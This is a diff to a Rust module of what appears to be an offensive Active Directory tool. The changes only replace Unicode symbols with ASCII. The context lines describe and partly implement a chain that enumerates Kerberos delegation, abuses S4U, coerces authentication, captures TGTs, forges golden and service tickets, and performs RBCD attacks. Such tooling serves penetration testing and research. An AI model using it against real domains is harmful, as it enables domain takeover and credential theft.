@@ -1,16 +1,16 @@
-//! Auto-chain delegation enumeration → forge ticket pipeline.
+//! Auto-chain delegation enumeration -> forge ticket pipeline.
 //!
 //! This module bridges hunter (delegation discovery) with forge (ticket generation)
 //! by automatically:
 //! 1. Enumerating constrained/unconstrained delegation targets
-//! 2. Identifying high-value attack paths (S4U2Self → S4U2Proxy chains)
+//! 2. Identifying high-value attack paths (S4U2Self -> S4U2Proxy chains)
 //! 3. Forging the appropriate tickets (Bronze Bit, constrained delegation tickets)
 //! 4. Returning ready-to-use credentials with tickets
 //!
 //! Attack flows supported:
-//! - Constrained delegation: Enumerate msDS-AllowedToDelegateTo → S4U2Self → S4U2Proxy → forge service ticket
-//! - Unconstrained delegation: Enumerate TRUSTED_FOR_DELEGATION → coerce auth → capture TGT → forge golden ticket
-//! - RBCD: Enumerate msDS-AllowedToActOnBehalfOfOtherIdentity → forge machine account → S4U2Proxy
+//! - Constrained delegation: Enumerate msDS-AllowedToDelegateTo -> S4U2Self -> S4U2Proxy -> forge service ticket
+//! - Unconstrained delegation: Enumerate TRUSTED_FOR_DELEGATION -> coerce auth -> capture TGT -> forge golden ticket
+//! - RBCD: Enumerate msDS-AllowedToActOnBehalfOfOtherIdentity -> forge machine account -> S4U2Proxy
 
 use crate::constrained::{self, ConstrainedConfig, S4UChainResult};
 use crate::rbcd::{self, RbcdConfig};
@@ -24,9 +24,9 @@ use overthrone_core::proto::ldap;
 use serde::{Deserialize, Serialize};
 use tracing::{info, warn};
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Result Structures
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Result of auto-chaining delegation enumeration to ticket forging
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -96,9 +96,9 @@ pub struct RbcdTicket {
     pub attack_success: bool,
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Configuration
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Configuration for delegation chain automation
 #[derive(Debug, Clone)]
@@ -133,15 +133,15 @@ impl Default for DelegationChainConfig {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Public API
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
-/// Execute full delegation enumeration → forge chain
+/// Execute full delegation enumeration -> forge chain
 ///
 /// This function:
 /// 1. Enumerates constrained delegation accounts
-/// 2. For each account, attempts S4U2Self → S4U2Proxy
+/// 2. For each account, attempts S4U2Self -> S4U2Proxy
 /// 3. Forges service tickets for discovered chains
 /// 4. Enumerates unconstrained delegation targets
 /// 5. (Optional) Coerces auth to unconstrained targets
@@ -153,7 +153,7 @@ pub async fn run_delegation_chain(
     let start = std::time::Instant::now();
     info!(
         "{}",
-        "═══ DELEGATION CHAIN AUTOMATION ═══"
+        "=== DELEGATION CHAIN AUTOMATION ==="
             .bold()
             .bright_magenta()
     );
@@ -167,7 +167,7 @@ pub async fn run_delegation_chain(
         total_time_ms: 0,
     };
 
-    // Phase 1: Constrained Delegation → S4U Chain → Forge Ticket
+    // Phase 1: Constrained Delegation -> S4U Chain -> Forge Ticket
     if chain_config.run_constrained {
         info!("Phase 1: Constrained delegation chain");
         match run_constrained_chain(hunt_config, chain_config).await {
@@ -183,7 +183,7 @@ pub async fn run_delegation_chain(
         }
     }
 
-    // Phase 2: Unconstrained Delegation → Coerce → Capture TGT
+    // Phase 2: Unconstrained Delegation -> Coerce -> Capture TGT
     if chain_config.run_unconstrained {
         info!("Phase 2: Unconstrained delegation chain");
         match run_unconstrained_chain(hunt_config, chain_config).await {
@@ -202,7 +202,7 @@ pub async fn run_delegation_chain(
         }
     }
 
-    // Phase 3: RBCD → Forge Machine Account → S4U2Proxy
+    // Phase 3: RBCD -> Forge Machine Account -> S4U2Proxy
     if chain_config.run_rbcd {
         info!("Phase 3: RBCD chain (INVASIVE - requires write access)");
         match run_rbcd_chain(hunt_config, chain_config).await {
@@ -227,9 +227,9 @@ pub async fn run_delegation_chain(
     Ok(result)
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Constrained Delegation Chain
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 async fn run_constrained_chain(
     hunt_config: &HuntConfig,
@@ -264,7 +264,7 @@ async fn run_constrained_chain(
     for chain in &enum_result.s4u_chains {
         if !chain.success {
             warn!(
-                "  S4U chain failed for {} → {}",
+                "  S4U chain failed for {} -> {}",
                 chain.source_account, chain.target_spn
             );
             tickets.push(ConstrainedChainTicket {
@@ -280,7 +280,7 @@ async fn run_constrained_chain(
         }
 
         info!(
-            "  Forging ticket: {} → {} as {}",
+            "  Forging ticket: {} -> {} as {}",
             chain.source_account, chain.target_spn, chain.impersonated_user
         );
 
@@ -336,9 +336,9 @@ async fn forge_constrained_ticket(
     })
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Unconstrained Delegation Chain
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 async fn run_unconstrained_chain(
     hunt_config: &HuntConfig,
@@ -516,7 +516,7 @@ async fn run_rbcd_chain(
                         match rbcd::run(hunt_config, &rbcd_config).await {
                             Ok(rbcd_result) => {
                                 if rbcd_result.success {
-                                    info!("    ✓ RBCD successful on {}", target_name);
+                                    info!("    [+] RBCD successful on {}", target_name);
 
                                     // Step 3d: Request TGT for the controlled account
                                     let tgt = kerberos::request_tgt(
@@ -544,13 +544,13 @@ async fn run_rbcd_chain(
                                     });
                                 } else {
                                     warn!(
-                                        "    ✗ RBCD failed on {}: {:?}",
+                                        "    [-] RBCD failed on {}: {:?}",
                                         target_name, rbcd_result.error
                                     );
                                 }
                             }
                             Err(e) => {
-                                warn!("    ✗ RBCD execution error: {}", e);
+                                warn!("    [-] RBCD execution error: {}", e);
                             }
                         }
                     }
@@ -615,9 +615,9 @@ fn binary_sid_to_string(sid_bytes: &[u8]) -> Result<String> {
     Ok(sid_string)
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Helpers
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 fn format_ticket_expiry(tgt: &TicketGrantingData) -> String {
     if let Some(end_time) = &tgt.end_time {
